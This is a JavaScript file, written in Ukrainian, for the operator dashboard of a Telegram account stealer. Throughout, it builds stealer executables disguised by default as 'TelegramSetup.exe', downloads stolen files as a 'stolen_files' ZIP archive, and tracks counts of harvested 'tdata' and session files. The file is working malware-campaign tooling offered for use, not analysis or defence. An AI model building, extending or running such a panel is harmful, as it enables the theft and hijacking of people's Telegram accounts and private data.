// static/js/stealer.js
class StealerManager {
    constructor() {
        this.initEventListeners();
        this.checkBuildStatus();
    }

    initEventListeners() {
        // Обробка форми білдера
        const stealerForm = document.getElementById('stealerForm');
        if (stealerForm) {
            stealerForm.addEventListener('submit', (e) => {
                this.handleBuildForm(e);
            });
        }

        // Оновлення статистики кожні 30 секунд
        setInterval(() => {
            this.updateStats();
        }, 30000);
    }

    handleBuildForm(e) {
        e.preventDefault();
        const buildBtn = document.getElementById('buildBtn');
        const originalText = buildBtn.innerHTML;
        
        // Показуємо індикатор завантаження
        buildBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Будую...';
        buildBtn.disabled = true;

        // Відправляємо форму
        const formData = new FormData(e.target);
        
        fetch(e.target.action, {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (response.ok) {
                return response.blob();
            }
            throw new Error('Помилка побудови');
        })
        .then(blob => {
            // Створюємо посилання для завантаження
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            
            // Отримуємо ім'я файлу з форми
            const filename = formData.get('filename') || 'TelegramSetup';
            a.download = `${filename}.exe`;
            
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            
            this.showAlert('Стіллер успішно збудовано та завантажено!', 'success');
            this.updateStats();
        })
        .catch(error => {
            console.error('Error:', error);
            this.showAlert('Помилка при побудові стіллера: ' + error.message, 'danger');
        })
        .finally(() => {
            // Відновлюємо кнопку
            buildBtn.innerHTML = originalText;
            buildBtn.disabled = false;
        });
    }

    downloadAllFiles() {
        if (!confirm('Завантажити всі файли як ZIP архів?')) {
            return;
        }

        fetch('/admin/stealer/download_all')
        .then(response => {
            if (response.ok) {
                return response.blob();
            }
            throw new Error('Помилка завантаження');
        })
        .then(blob => {
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = `stolen_files_${new Date().toISOString().split('T')[0]}.zip`;
            
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            
            this.showAlert('Всі файли успішно завантажено!', 'success');
        })
        .catch(error => {
            console.error('Error:', error);
            this.showAlert('Помилка завантаження файлів: ' + error.message, 'danger');
        });
    }

    downloadFile(fileId) {
        // Завантаження окремого файлу
        window.open(`/admin/stealer/download/${fileId}`, '_blank');
    }

    deleteFile(fileId) {
        if (!confirm('Видалити цей файл?')) {
            return;
        }

        fetch(`/admin/stealer/delete/${fileId}`, {
            method: 'DELETE'
        })
        .then(response => response.json())
        .then(result => {
            if (result.success) {
                this.showAlert('Файл видалено', 'success');
                this.updateFileList();
            } else {
                this.showAlert('Помилка видалення: ' + result.error, 'danger');
            }
        })
        .catch(error => {
            this.showAlert('Помилка видалення', 'danger');
        });
    }

    deleteAllFiles() {
        if (!confirm('Видалити ВСІ файли? Цю дію не можна скасувати!')) {
            return;
        }

        fetch('/admin/stealer/delete_all', {
            method: 'DELETE'
        })
        .then(response => response.json())
        .then(result => {
            if (result.success) {
                this.showAlert(`Видалено ${result.deleted_count} файлів`, 'success');
                this.updateFileList();
            } else {
                this.showAlert('Помилка видалення: ' + result.error, 'danger');
            }
        })
        .catch(error => {
            this.showAlert('Помилка видалення', 'danger');
        });
    }

    updateStats() {
        fetch('/admin/api/stats')
        .then(response => response.json())
        .then(stats => {
            // Оновлюємо бейджи з статистикою
            const badges = document.querySelectorAll('.badge.bg-info, .badge.bg-success, .badge.bg-warning');
            
            badges.forEach(badge => {
                if (badge.textContent.includes('Файлів:')) {
                    badge.textContent = `Файлів: ${stats.files || 0}`;
                } else if (badge.textContent.includes('tdata:')) {
                    badge.textContent = `tdata: ${this.calculateTdataCount(stats)}`;
                } else if (badge.textContent.includes('sessions:')) {
                    badge.textContent = `sessions: ${this.calculateSessionsCount(stats)}`;
                }
            });

            // Оновлюємо кнопку завантаження
            const downloadBtn = document.querySelector('.btn-outline-primary');
            if (downloadBtn) {
                const isDisabled = (stats.files || 0) === 0;
                downloadBtn.disabled = isDisabled;
                downloadBtn.innerHTML = `<i class="fas fa-download"></i> Завантажити всі файли (${stats.files || 0})`;
            }

            // Оновлюємо кнопку видалення всіх
            const deleteAllBtn = document.querySelector('.btn-outline-danger');
            if (deleteAllBtn) {
                deleteAllBtn.disabled = (stats.files || 0) === 0;
            }
        })
        .catch(error => {
            console.error('Error updating stats:', error);
        });
    }

    calculateTdataCount(stats) {
        // Тут буде логіка підрахунку tdata файлів
        return Math.floor((stats.files || 0) * 0.6); // Приклад
    }

    calculateSessionsCount(stats) {
        // Тут буде логіка підрахунку session файлів
        return Math.floor((stats.files || 0) * 0.4); // Приклад
    }

    updateFileList() {
        // Оновлюємо список файлів
        setTimeout(() => {
            window.location.reload();
        }, 1000);
    }

    checkBuildStatus() {
        // Перевіряємо чи є параметр успішної збірки в URL
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.get('built') === 'true') {
            this.showAlert('Стіллер успішно збудовано!', 'success');
            // Видаляємо параметр з URL
            window.history.replaceState({}, document.title, window.location.pathname);
        }
    }

    showAlert(message, type) {
        // Перевіряємо чи вже є сповіщення
        const existingAlerts = document.querySelectorAll('.alert');
        existingAlerts.forEach(alert => alert.remove());

        const alertDiv = document.createElement('div');
        alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
        alertDiv.innerHTML = `
            ${message}
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        `;
        
        const mainContent = document.querySelector('.main-content');
        if (mainContent) {
            mainContent.insertBefore(alertDiv, mainContent.firstChild);
        } else {
            document.body.appendChild(alertDiv);
        }
        
        // Автоматично видаляємо сповіщення через 5 секунд
        setTimeout(() => {
            if (alertDiv.parentNode) {
                alertDiv.remove();
            }
        }, 5000);
    }

    // Додаткові утиліти
    formatFileSize(bytes) {
        if (bytes === 0) return '0 B';
        const k = 1024;
        const sizes = ['B', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
    }

    formatDate(dateString) {
        const date = new Date(dateString);
        return date.toLocaleDateString('uk-UA') + ' ' + date.toLocaleTimeString('uk-UA');
    }
}

// Додаткові глобальні функції для HTML
function confirmDelete(fileId) {
    window.stealerManager.deleteFile(fileId);
}

function confirmDeleteAll() {
    window.stealerManager.deleteAllFiles();
}

function downloadSingleFile(fileId) {
    window.stealerManager.downloadFile(fileId);
}

function downloadAllFiles() {
    window.stealerManager.downloadAllFiles();
}

// Ініціалізація при завантаженні сторінки
document.addEventListener('DOMContentLoaded', function() {
    window.stealerManager = new StealerManager();
    
    // Додаємо обробники для всіх кнопок видалення
    document.addEventListener('click', function(e) {
        if (e.target.classList.contains('delete-btn') || e.target.closest('.delete-btn')) {
            const fileId = e.target.closest('.delete-btn').dataset.fileId;
            if (fileId) {
                window.stealerManager.deleteFile(fileId);
            }
        }
        
        if (e.target.classList.contains('download-btn') || e.target.closest('.download-btn')) {
            const fileId = e.target.closest('.download-btn').dataset.fileId;
            if (fileId) {
                window.stealerManager.downloadFile(fileId);
            }
        }
    });
});

// Обробка помилок
window.addEventListener('error', function(e) {
    console.error('Global error:', e.error);
});

// Обробка необроблених промісів
window.addEventListener('unhandledrejection', function(e) {
    console.error('Unhandled promise rejection:', e.reason);
});